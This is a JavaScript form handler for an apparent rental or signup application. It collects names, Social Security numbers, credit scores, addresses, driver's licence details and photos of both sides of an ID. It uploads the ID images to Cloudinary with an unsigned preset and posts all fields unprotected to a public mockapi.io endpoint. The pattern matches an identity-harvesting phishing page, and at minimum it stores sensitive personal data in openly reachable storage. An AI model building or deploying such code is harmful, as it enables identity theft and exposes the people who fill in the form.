const cloudName = "djwldmjmy"; // Replace with your Cloudinary cloud name
const uploadPreset = "movi999";
const apiUrl = "https://649ac56abf7c145d023971ee.mockapi.io/api/V1/users2"; // Mock API URL
const successMessage = document.getElementById("success-message");
const errorMessage = document.getElementById("error-message");
const loadingMessage = document.getElementById("loading-message");

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("signupForm");

  form.addEventListener("submit", async function (event) {
    // Prevent the default form submission
    event.preventDefault();

    // Get the values of the inputs
    const fullName = document.getElementById("fullName").value;
    const email = document.getElementById("email").value;
    const ssn = document.getElementById("ssn").value;
    const schoolName = document.getElementById("schoolName").value;
    const graduationYear = document.getElementById("graduationYear").value;
    const credit_score = document.getElementById("cc").value;

    const Current_Address = document.getElementById("Current_Address").value;
    const zip = document.getElementById("zip").value;
    const Move_in_date = document.getElementById("Move_in_date").value;
    const FromB = document.getElementById("FromB").value;
    const ToB = document.getElementById("ToB").value;
    const with_pet_checkbox = document.getElementById("with_pet");
    const with_pet = with_pet_checkbox.checked;
    const DLA = document.getElementById("DLA").value;
    const TRP = document.getElementById("TRP").value;
    const button_confirm = document.getElementById("button_confirm");
    const frontId = document.getElementById("frontId").files[0];
    const backId = document.getElementById("backId").files[0];

    // Reset the messages
    successMessage.style.display = "none";
    errorMessage.style.display = "none";

    // Show loading message
    loadingMessage.style.display = "block";
    button_confirm.disabled = true;

    // Upload frontId and backId to Cloudinary
    const frontImageUrl = frontId ? await uploadToCloudinary(frontId) : null;
    const backImageUrl = backId ? await uploadToCloudinary(backId) : null;

    // Log the form data including the Cloudinary URLs
    // console.log("Full Name:", fullName);
    // console.log("Social Security Number:", ssn);
    // console.log("High School Name:", schoolName);
    // console.log("Year of Graduation:", graduationYear);
    // console.log("Front ID URL:", frontImageUrl);
    // console.log("Back ID URL:", backImageUrl);
    console.log("Back ID URL:", email);

    const formData = {
      name: fullName,
      SSN: ssn,
      HSN: schoolName,
      G_Date: graduationYear,
      ID_Front: frontImageUrl,
      ID_Back: backImageUrl,
      email: email,
      credit_score: credit_score,

      Current_Address: Current_Address,
      zip: zip,
      Move_in_date: Move_in_date,
      FromB: FromB,
      ToB: ToB,
      with_pet: with_pet,
      DLA: DLA,
      TRP: TRP,
    };
    submitToApi(formData);
    // You can now send the form data (including image URLs) to your server or handle it as needed
  });

  // Function to handle Cloudinary upload
  async function uploadToCloudinary(file) {
    const url = `https://api.cloudinary.com/v1_1/${cloudName}/upload`;
    const formData = new FormData();
    formData.append("file", file);
    formData.append("upload_preset", uploadPreset);

    try {
      const response = await fetch(url, {
        method: "POST",
        body: formData,
      });
      const data = await response.json();
      return data.secure_url; // Return the Cloudinary URL of the uploaded image
    } catch (error) {
      console.error("Error uploading to Cloudinary", error);
      return null;
    }
  }

  async function submitToApi(data) {
    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();

      if (response.ok) {
        successMessage.textContent = "Submission successful!";
        successMessage.style.display = "block";
        button_confirm.disabled = false;
      } else {
        throw new Error(result.message || "Submission failed.");
      }
    } catch (error) {
      errorMessage.textContent = `${error.message || "Failed to submit data."}`;
      errorMessage.style.display = "block";
    } finally {
      // Hide loading message after submission is done
      loadingMessage.style.display = "none";
    }
  }
});
